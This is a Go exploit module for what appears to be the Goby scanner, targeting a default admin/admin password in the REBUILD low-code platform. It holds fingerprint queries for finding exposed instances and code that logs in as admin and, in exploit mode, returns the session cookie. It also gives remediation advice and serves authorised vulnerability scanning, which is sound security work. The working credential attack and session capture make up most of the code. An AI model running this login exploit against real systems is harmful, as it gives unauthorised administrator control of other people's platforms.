package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "REBUILD default password vulnerability",
    "Description": "<p>REBUILD focuses on the realization of business needs, rather than the basic technical framework or project startup template. Through REBUILD, you can truly achieve rapid construction with zero code, without programming, compiling code, or even knowing any technology.</p><p>REBUILD has a default password of admin/admin. An attacker can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.</p>",
    "Product": "REBUILD",
    "Homepage": "https://github.com/getrebuild/rebuild",
    "DisclosureDate": "2023-03-22",
    "Author": "sunying",
    "FofaQuery": "body=\"rb.appName\" || body=\"rb.locale\" || body=\"rb-splash-screen\" || title==\"REBUILD\" || banner=\"X-Rb-Server\" || header=\"X-Rb-Server\"",
    "GobyQuery": "body=\"rb.appName\" || body=\"rb.locale\" || body=\"rb-splash-screen\" || title==\"REBUILD\" || banner=\"X-Rb-Server\" || header=\"X-Rb-Server\"",
    "Level": "2",
    "Impact": "<p>REBUILD has a default password of admin/admin. An attacker can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "REBUILD 默认口令漏洞",
            "Product": "REBUILD",
            "Description": "<p>REBUILD 侧重于业务需求实现，而非基础技术框架或项目启动模板，通过 REBUILD 可以真正实现零代码快速搭建，无需编程、无需编译代码，甚至无需了解任何技术。</p><p>REBUILD 存在默认口令 admin/admin，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>REBUILD 存在默认口令 admin/admin，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "REBUILD default password vulnerability",
            "Product": "REBUILD",
            "Description": "<p>REBUILD focuses on the realization of business needs, rather than the basic technical framework or project startup template. Through REBUILD, you can truly achieve rapid construction with zero code, without programming, compiling code, or even knowing any technology.</p><p>REBUILD has a default password of admin/admin. An attacker can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>REBUILD has a default password of admin/admin. An attacker can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-27",
    "PocId": "10860"
}`
	sendPayload831dsa := func(hostinfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		loginRequestConfig := httpclient.NewPostRequestConfig("/user/user-login?user=admin&passwd=******&autoLogin=false&vcode=")
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.FollowRedirect = false
		loginRequestConfig.Data = "admin"
		return httpclient.DoHttpRequest(hostinfo, loginRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if resp, _ := sendPayload831dsa(hostInfo); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"error_code\":0") && strings.Contains(resp.Utf8Html, "\"error_msg\":\"调用成功\"") {
				ss.VulURL = hostInfo.Scheme() + "://admin:admin@" + hostInfo.HostInfo
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "login" {
				if resp, err := sendPayload831dsa(expResult.HostInfo); err != nil {
					expResult.Output = err.Error()
				} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"error_code\":0") && strings.Contains(resp.Utf8Html, "\"error_msg\":\"调用成功\"") {
					expResult.Success = true
					expResult.Output += "Cookie: " + resp.Cookie
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
